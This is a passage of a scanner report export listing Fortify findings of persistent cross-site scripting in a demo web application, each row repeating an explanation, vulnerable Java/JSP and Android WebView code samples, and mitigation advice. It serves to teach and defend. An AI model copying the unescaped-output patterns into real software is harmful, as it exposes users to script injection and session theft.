applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","168","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/advanced.jsp","","","http://localhost/root/advanced.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","170","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/advanced.jsp","","","http://localhost/root/advanced.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... 